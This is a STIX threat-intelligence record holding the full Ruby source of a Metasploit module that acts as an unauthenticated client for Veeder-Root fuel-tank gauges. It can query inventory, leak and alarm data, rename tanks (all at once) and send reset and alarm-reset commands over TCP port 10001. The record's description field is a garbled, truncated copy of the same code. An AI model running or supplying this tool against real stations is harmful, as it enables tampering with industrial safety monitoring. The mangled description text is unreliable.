{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a68da2ad-1d20-452f-9cec-77c3990d77b1",
    "created": "2024-08-14T16:24:23.762295Z",
    "modified": "2024-08-14T16:24:23.762299Z",
    "name": "Veeder-Root Automatic Tank Gauge (ATG) Administrative Client",
    "description": "Version information 'TLS-250_CMD' => \"\\x01980\" 'TLS-350_CMD' => \"\\x01I90200\"  ] ] )  register_options( [ Opt::RPORT(10001) OptInt.new('TANK_NUMBER', [false, 'The tank number to operate on (use with SET_TANK_NAME, 0 to change all)', 1]) OptString.new('TANK_NAME', [false, 'The tank name to set (use with SET_TANK_NAME, defaults to random)']) ] ) deregister_options('SSL', 'SSLCipher', 'SSLVerifyMode', 'SSLVersion')  register_advanced_options( [ OptEnum.new('PROTOCOL', [true, 'The Veeder-Root TLS protocol to speak', 'TLS-350', %w(TLS-350 TLS-250)]) OptInt.new('TIMEOUT', [true, 'Time in seconds to wait for responses to our probes', 5]) ] ) end  def setup # ensure that the specified command is implemented for the desired version of the TLS protocol unless action.opts.keys.include?(protocol_opt_name) fail_with(Failure::BadConfig, \"#{action.name} not defined for #{protocol}\") end  # ensure that the tank number is set for the commands that need it if action.name == 'SET_TANK_NAME' && (tank_number < 0 || tank_number > 99) fail_with(Failure::BadConfig, \"TANK_NUMBER #{tank_number} is invalid\") end  unless timeout > 0 fail_with(Failure::BadConfig, \"Invalid timeout #{timeout} -- must be > 0\") end end  def get_response(request) sock.put(request) response = sock.get_once(-1, timeout) response.strip! response += \" (command not understood)\" if response == \"9999FF1B\" response end  def protocol datastore['PROTOCOL'] end  def protocol_opt_name protocol + '_CMD' end  def tank_name @tank_name ||= (datastore['TANK_NAME'] ? datastore['TANK_NAME'] : Rex::Text.rand_text_alpha(16)) end  def tank_number datastore['TANK_NUMBER'] end  def time if datastore['TIME'] Time.parse(datastore['TIME']).to_i else Time.now.to_i end end  def timeout datastore['TIMEOUT'] end  def run_host(_host) begin connect case action.name when 'SET_TANK_NAME' # send the set tank name command to change the tank name(s) if tank_number == 0 vprint_status(\"Setting all tank names to #{tank_name}\") else vprint_status(\"Setting tank ##{tank_number}'s name to #{tank_name}\") end request = \"#{action.opts[protocol_opt_name]}#{format('%02d', tank_number)}#{tank_name}\\n\" sock.put(request) # reconnect disconnect connect # send an inventory probe to show that it succeeded inventory_probe = \"#{actions.find { |a| a.name == 'INVENTORY' }.opts[protocol_opt_name]}\\n\" inventory_response = get_response(inventory_probe) message = \"#{protocol} #{action.opts['Description']}:\\n#{inventory_response}\" if inventory_response.include?(tank_name) print_good message else print_warning message end else response = get_response(\"#{action.opts[protocol_opt_name]}\\n\") print_good(\"#{protocol} #{action.opts['Description']}:\") print_line(response) end ensure disconnect end end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/atg/atg_client.rb",
            "external_id": "atg_client.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/01/22/the-internet-of-gas-station-tank-gauges/"
        },
        {
            "source_name": "reference",
            "url": "https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/the-gaspot-experiment"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sjhilt/GasPot"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mushorg/conpot"
        },
        {
            "source_name": "reference",
            "url": "https://www.veeder.com/us/automatic-tank-gauge-atg-consoles"
        },
        {
            "source_name": "reference",
            "url": "https://cdn.chipkin.com/files/liz/576013-635.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://docs.veeder.com/gold/download.cfm?doc_id=6227"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Veeder-Root Automatic Tank Gauge (ATG) Administrative Client',\n      'Description'    => %q{\n        This module acts as a simplistic administrative client for interfacing\n        with Veeder-Root Automatic Tank Gauges (ATGs) or other devices speaking\n        the TLS-250 and TLS-350 protocols.  This has been tested against\n        GasPot and Conpot, both honeypots meant to simulate ATGs; it has not\n        been tested against anything else, so use at your own risk.\n      },\n      'Author'         =>\n        [\n          'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'https://www.rapid7.com/blog/post/2015/01/22/the-internet-of-gas-station-tank-gauges/'],\n          ['URL', 'https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/the-gaspot-experiment'],\n          ['URL', 'https://github.com/sjhilt/GasPot'],\n          ['URL', 'https://github.com/mushorg/conpot'],\n          ['URL', 'https://www.veeder.com/us/automatic-tank-gauge-atg-consoles'],\n          ['URL', 'https://cdn.chipkin.com/files/liz/576013-635.pdf'],\n          ['URL', 'https://docs.veeder.com/gold/download.cfm?doc_id=6227']\n        ],\n      'DefaultAction'  => 'INVENTORY',\n      'Actions'        =>\n        [\n          [ 'ALARM',\n            {\n              'Description' => 'I30200 Sensor alarm history (untested)',\n              'TLS-350_CMD' => \"\\x01I30200\"\n            }\n          ],\n          [ 'ALARM_RESET',\n            {\n              'Description' => 'IS00300 Remote alarm reset (untested)',\n              'TLS-350_CMD' => \"\\x01IS00300\"\n            }\n          ],\n          [ 'DELIVERY',\n            {\n              'Description' => 'I20200 Delivery report',\n              'TLS-350_CMD' => \"\\x01I20200\"\n            }\n          ],\n          [ 'INVENTORY',\n            {\n              'Description' => '200/I20100 In-tank inventory report',\n              'TLS-250_CMD' => \"\\x01200\",\n              'TLS-350_CMD' => \"\\x01I20100\"\n            }\n          ],\n          [ 'LEAK',\n            {\n              'Description' => 'I20300 Leak report',\n              'TLS-350_CMD' => \"\\x01I20300\"\n            }\n          ],\n          [ 'RELAY',\n            {\n              'Description' => 'I40600 Relay status (untested)',\n              'TLS-350_CMD' => \"\\x01I40600\"\n            }\n          ],\n          [ 'RESET',\n            {\n              'Description' => 'IS00100 Reset (untested)',\n              'TLS-350_CMD' => \"\\x01IS00100\"\n            }\n          ],\n          [ 'CLEAR_RESET',\n            {\n              'Description' => 'IS00200 Clear Reset Flag (untested)',\n              'TLS-350_CMD' => \"\\x01IS00200\"\n            }\n          ],\n          [ 'SENSOR',\n            {\n              'Description' => 'I30100 Sensor status (untested)',\n              'TLS-350_CMD' => \"\\x01I30100\"\n            }\n          ],\n          [ 'SENSOR_DIAG',\n            {\n              'Description' => 'IB0100 Sensor diagnostics (untested)',\n              'TLS-350_CMD' => \"\\x01IB0100\"\n            }\n          ],\n          [ 'SHIFT',\n            {\n              'Description' => 'I20400 Shift report',\n              'TLS-350_CMD' => \"\\x01I20400\"\n            }\n          ],\n          [ 'SET_TANK_NAME',\n            {\n              'Description' => 'S602 set tank name (use TANK_NUMBER and TANK_NAME options)',\n              'TLS-350_CMD' => \"\\x01S602\"\n            }\n          ],\n          # [ 'SET_TIME',\n          #   {\n          #     'Description' => 'S50100 Set time of day (use TIME option) (untested)',\n          #     'TLS-350_CMD' => \"\\x01S50100\"\n          #   }\n          # ],\n          [ 'STATUS',\n            {\n              'Description' => 'I20500 In-tank status report',\n              'TLS-350_CMD' => \"\\x01I20500\"\n            }\n          ],\n          [ 'SYSTEM_STATUS',\n            {\n              'Description' => 'I10100 System status report (untested)',\n              'TLS-350_CMD' => \"\\x01I10100\"\n            }\n          ],\n          [ 'TANK_ALARM',\n            {\n              'Description' => 'I20600 Tank alarm history (untested)',\n              'TLS-350_CMD' => \"\\x01I20600\"\n            }\n          ],\n          [ 'TANK_DIAG',\n            {\n              'Description' => 'IA0100 Tank diagnostics (untested)',\n              'TLS-350_CMD' => \"\\x01IA0100\"\n            }\n          ],\n          [ 'VERSION',\n            {\n              'Description' => 'Version information',\n              'TLS-250_CMD' => \"\\x01980\",\n              'TLS-350_CMD' => \"\\x01I90200\"\n            }\n          ]\n        ]\n    )\n\n    register_options(\n      [\n        Opt::RPORT(10001),\n        OptInt.new('TANK_NUMBER', [false, 'The tank number to operate on (use with SET_TANK_NAME, 0 to change all)', 1]),\n        OptString.new('TANK_NAME', [false, 'The tank name to set (use with SET_TANK_NAME, defaults to random)'])\n      ]\n    )\n    deregister_options('SSL', 'SSLCipher', 'SSLVerifyMode', 'SSLVersion')\n\n    register_advanced_options(\n      [\n        OptEnum.new('PROTOCOL', [true, 'The Veeder-Root TLS protocol to speak', 'TLS-350', %w(TLS-350 TLS-250)]),\n        OptInt.new('TIMEOUT', [true, 'Time in seconds to wait for responses to our probes', 5])\n      ]\n    )\n  end\n\n  def setup\n    # ensure that the specified command is implemented for the desired version of the TLS protocol\n    unless action.opts.keys.include?(protocol_opt_name)\n      fail_with(Failure::BadConfig, \"#{action.name} not defined for #{protocol}\")\n    end\n\n    # ensure that the tank number is set for the commands that need it\n    if action.name == 'SET_TANK_NAME' && (tank_number < 0 || tank_number > 99)\n      fail_with(Failure::BadConfig, \"TANK_NUMBER #{tank_number} is invalid\")\n    end\n\n    unless timeout > 0\n      fail_with(Failure::BadConfig, \"Invalid timeout #{timeout} -- must be > 0\")\n    end\n  end\n\n  def get_response(request)\n    sock.put(request)\n    response = sock.get_once(-1, timeout)\n    response.strip!\n    response += \" (command not understood)\" if response == \"9999FF1B\"\n    response\n  end\n\n  def protocol\n    datastore['PROTOCOL']\n  end\n\n  def protocol_opt_name\n    protocol + '_CMD'\n  end\n\n  def tank_name\n    @tank_name ||= (datastore['TANK_NAME'] ? datastore['TANK_NAME'] : Rex::Text.rand_text_alpha(16))\n  end\n\n  def tank_number\n    datastore['TANK_NUMBER']\n  end\n\n  def time\n    if datastore['TIME']\n      Time.parse(datastore['TIME']).to_i\n    else\n      Time.now.to_i\n    end\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\n\n  def run_host(_host)\n    begin\n      connect\n      case action.name\n      when 'SET_TANK_NAME'\n        # send the set tank name command to change the tank name(s)\n        if tank_number == 0\n          vprint_status(\"Setting all tank names to #{tank_name}\")\n        else\n          vprint_status(\"Setting tank ##{tank_number}'s name to #{tank_name}\")\n        end\n        request = \"#{action.opts[protocol_opt_name]}#{format('%02d', tank_number)}#{tank_name}\\n\"\n        sock.put(request)\n        # reconnect\n        disconnect\n        connect\n        # send an inventory probe to show that it succeeded\n        inventory_probe = \"#{actions.find { |a| a.name == 'INVENTORY' }.opts[protocol_opt_name]}\\n\"\n        inventory_response = get_response(inventory_probe)\n        message = \"#{protocol} #{action.opts['Description']}:\\n#{inventory_response}\"\n        if inventory_response.include?(tank_name)\n          print_good message\n        else\n          print_warning message\n        end\n      else\n        response = get_response(\"#{action.opts[protocol_opt_name]}\\n\")\n        print_good(\"#{protocol} #{action.opts['Description']}:\")\n        print_line(response)\n      end\n    ensure\n      disconnect\n    end\n  end\nend\n"
}